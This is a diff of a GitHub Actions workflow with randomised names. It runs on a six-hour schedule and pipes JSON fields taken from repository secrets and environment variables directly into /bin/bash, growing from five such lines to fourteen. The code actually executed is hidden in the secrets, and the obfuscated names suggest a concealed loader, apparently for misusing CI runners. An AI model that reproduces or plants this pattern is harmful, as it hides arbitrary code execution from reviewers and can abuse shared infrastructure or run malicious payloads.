@@ -2,20 +2,29 @@ name: shidakai6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
-
+    - cron: '38 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shidakai6789
         env:
-          c8: ${{ secrets.c8 }}
+          ijie14: ${{ secrets.ijie14 }}
         run: |
-          echo $c8 | jq -r .rf7219 | /bin/bash
-          echo $l768 | jq -r .el34 | /bin/bash
-          echo $wwvcb652 | jq -r .xd1 | /bin/bash
-          echo $tq9 | jq -r .qvazz00 | /bin/bash
-          echo $svr1840 | jq -r .qdri71 | /bin/bash
+          echo $ijie14 | jq -r .vb6 | /bin/bash
+          echo $vagfc7532 | jq -r .q739 | /bin/bash
+          echo $ehnw62 | jq -r .yi41099 | /bin/bash
+          echo $qcwf12 | jq -r .zj232 | /bin/bash
+          echo $qrgj4328 | jq -r .eoi68 | /bin/bash
+          echo $n9 | jq -r .u3448 | /bin/bash
+          echo $yx77469 | jq -r .i94179 | /bin/bash
+          echo $igl46616 | jq -r .gvjdn91047 | /bin/bash
+          echo $lx5 | jq -r .dhhy38369 | /bin/bash
+          echo $wtyi81789 | jq -r .ljme4 | /bin/bash
+          echo $m24 | jq -r .j144 | /bin/bash
+          echo $s4 | jq -r .b8 | /bin/bash
+          echo $au310 | jq -r .nrje4 | /bin/bash
+          echo $i4 | jq -r .wtdwk4058 | /bin/bash
 
